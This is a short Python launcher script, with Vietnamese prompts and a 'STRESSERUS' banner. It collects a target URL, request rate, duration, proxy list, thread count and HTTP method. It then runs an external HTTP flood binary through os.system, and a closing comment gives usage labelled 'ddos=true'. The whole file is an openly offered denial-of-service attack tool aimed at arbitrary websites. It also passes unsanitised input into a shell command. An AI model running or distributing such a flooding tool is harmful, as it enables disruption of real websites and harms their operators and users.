import os
os.system("cls" if os.name == "nt" else "clear")
a='''
  @@@@@@ @@@@@@@ @@@@@@@  @@@@@@@@  @@@@@@  @@@@@@ @@@@@@@@ @@@@@@@  @@@  @@@  @@@@@@
 !@@       @@!   @@!  @@@ @@!      !@@     !@@     @@!      @@!  @@@ @@!  @@@ !@@    
  !@@!!    @!!   @!@!!@!  @!!!:!    !@@!!   !@@!!  @!!!:!   @!@!!@!  @!@  !@!  !@@!! 
     !:!   !!:   !!: :!!  !!:          !:!     !:! !!:      !!: :!!  !!:  !!!     !:!
 ::.: :     :     :   : : : :: ::: ::.: :  ::.: :  : :: :::  :   : :  :.:: :  ::.: : 
                                                                   HTTPLOOD - Đậu Đậu                                                                                          
	'''
print(a)
URL=input("  [+] Nhập URL Taget: ")
LIMIT=int(input("  [+] Nhập số rate (64): "))
TIME=int(input("  [+] Nhập Time (s): "))
proxyfile=input("  [+] Nhập file proxy (proxy.txt): ")
THREADS=int(input("  [+] Nhập số luồng: "))
METHOD=input("  [+] Nhập method (GET, POST, HEAD): ")
print("=========================================")
os.system(f"./StresserUS version=2 host={URL} limit={LIMIT} time={TIME} list={proxyfile} threads={THREADS} mode={METHOD}")
input()#copyright by daudau
#./StresserUS version=2 host=<url> limit=<rate> time=<time> list=<proxyfile> threads=<thread> mode=<GET/POST> cookie=<ddos=true> data=<post=true>
